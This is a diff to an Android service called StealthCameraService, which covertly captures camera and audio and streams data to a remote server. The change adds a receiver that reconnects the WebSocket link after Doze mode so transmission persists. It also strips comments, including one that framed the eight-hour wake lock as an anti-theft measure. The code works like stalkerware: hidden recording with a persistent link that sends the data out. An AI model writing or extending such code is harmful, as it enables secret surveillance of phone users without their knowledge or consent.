@@ -6,8 +6,10 @@ import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
+import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.graphics.ImageFormat;
@@ -56,6 +58,8 @@ public class StealthCameraService extends Service {
     private AudioRecorder audioRecorder;
     private String deviceId;
 
+    private BroadcastReceiver dozeModeReceiver;
+
     @Override
     public void onCreate() {
         super.onCreate();
@@ -80,7 +84,33 @@ public class StealthCameraService extends Service {
         acquireWakeLock();
 
         dataTransmitter.testConnection(deviceId);
-        startForeground(8004, createNotification()); // Bug #35: уникальный ID (1001, 8001-8003 уже заняты)
+        startForeground(8004, createNotification());
+        registerDozeModeReceiver();
+    }
+
+    private void registerDozeModeReceiver() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            dozeModeReceiver = new BroadcastReceiver() {
+                @Override
+                public void onReceive(Context context, Intent intent) {
+                    if (PowerManager.ACTION_DEVICE_IDLE_MODE_CHANGED.equals(intent.getAction())) {
+                        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+                        if (pm != null && !pm.isDeviceIdleMode()) {
+                            // Телефон вышел из Doze — переподключаем WebSocket
+                            Log.d(TAG, "Exited Doze mode, reconnecting WebSocket");
+                            if (dataTransmitter != null && !dataTransmitter.isConnected()) {
+                                dataTransmitter.testConnection(deviceId);
+                            }
+                        }
+                    }
+                }
+            };
+
+            IntentFilter filter = new IntentFilter();
+            filter.addAction(PowerManager.ACTION_DEVICE_IDLE_MODE_CHANGED);
+            registerReceiver(dozeModeReceiver, filter);
+            Log.d(TAG, "Doze mode receiver registered");
+        }
     }
 
     @Override
@@ -199,6 +229,12 @@ public class StealthCameraService extends Service {
 
     @Override
     public void onDestroy() {
+        if (dozeModeReceiver != null) {
+            try {
+                unregisterReceiver(dozeModeReceiver);
+            } catch (Exception ignored) {}
+            dozeModeReceiver = null;
+        }
         stopAudioCapture();
         deactivateStealthMode();
         stopBackgroundThread();
@@ -623,7 +659,7 @@ public class StealthCameraService extends Service {
         PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
         if (powerManager != null) {
             wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "StealthCamera::WakeLock");
-            wakeLock.acquire(8 * 60 * 60 * 1000L); // 8 часов — достаточно для антикражного сценария
+            wakeLock.acquire(8 * 60 * 60 * 1000L);
         }
     }
 
@@ -649,13 +685,11 @@ public class StealthCameraService extends Service {
 
         closeCamera();
 
-        // A2: Проверка на null перед переключением камеры
         if (currentCameraId == null || frontCameraId == null || backCameraId == null) {
             Log.e(TAG, "Camera IDs not initialized, cannot switch");
             return;
         }
 
-        // Bug #21: Используем postDelayed вместо Thread.sleep чтобы не блокировать main thread
         String newCameraId = currentCameraId.equals(frontCameraId) ? backCameraId : frontCameraId;
         Log.d(TAG, "Switching to camera: " + newCameraId);
 
